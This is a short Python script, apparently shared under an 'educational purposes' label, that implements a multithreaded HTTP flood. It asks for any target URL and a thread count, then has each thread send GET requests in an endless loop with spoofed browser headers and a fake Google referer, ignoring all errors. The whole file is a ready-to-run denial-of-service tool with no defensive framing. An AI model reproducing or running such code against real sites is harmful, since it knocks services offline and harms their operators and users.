"""
Made by igna#0911 | Made for educational purposes
"""
import requests, threading, os

url = input("[+] Enter the URL: ")


class Flooder:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Referer": "https://google.com",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        }

    def Flood(self):
        count = 0
        while True:
            try:
                self.session.get(url, headers=self.headers)
                count += 1
                print(f"[+] {count} requests sent")
            except:
                pass


if __name__ == "__main__":
    try:
        for x in range(int(input("[+] Enter the amount of threads: "))):
            threading.Thread(target=Flooder().Flood).start()
    except KeyboardInterrupt:
        print("[+] Exiting...")
        exit()
